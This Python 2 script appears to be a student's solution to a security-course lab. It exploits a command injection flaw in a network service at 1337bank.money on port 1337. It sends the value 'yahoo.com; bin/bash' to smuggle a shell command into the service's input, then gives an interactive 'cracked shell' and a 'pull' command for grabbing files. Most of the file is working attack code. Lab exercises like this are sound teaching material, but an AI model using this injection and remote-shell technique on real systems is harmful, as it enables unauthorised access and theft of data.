"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket

host = "1337bank.money" # IP address here
port = 1337 # Port here

def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    
    new_cmd = cmd + '\n'
    data = sock.recv(1024)
    #print("discard me: " + data)
    #print('\n\n\n')

    sock.send(new_cmd)
    data = sock.recv(1024)
    #print("some data should have printed")
    print(data)

    #sock.send(new_cmd)
    #data = sock.recv(1024)
    #print("some data should have printed x 2222")
    #print(data)



if __name__ == '__main__':
    s = raw_input("Enter The Command You Would Like To Run, or 'help' for help: ")
    
    while s != 'quit':
        if s == 'help':
            print("shell Drop into an interactive shell and allow users to gracefully exit\npull <remote-path> <local-path> Download files\nhelp Shows this help menu\nquit Quit the shell")
        elif s == 'shell':

            input = ""
            while input != 'exit':
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((host, port))
                data = sock.recv(1024)
                sock.send('yahoo.com; bin/bash\n')
                data = sock.recv(1024)
                
                while 1:
                    input = raw_input('cracked shell $: ')
                    sock.send((input + '\n'))
                    result = sock.recv(1024)
                    if not len(result) :
                        sock.close();
                        break;
                    print(result);

        elif 'pull' in s:
            pull_cmd = 'yahoo.com; bin/bash; ' + s
            execute_cmd(pull_cmd)
        else:
            print('Please enter a valid command, enter help for help')
        s = raw_input("Enter The Command You Would Like To Run, or 'help' for help: ")



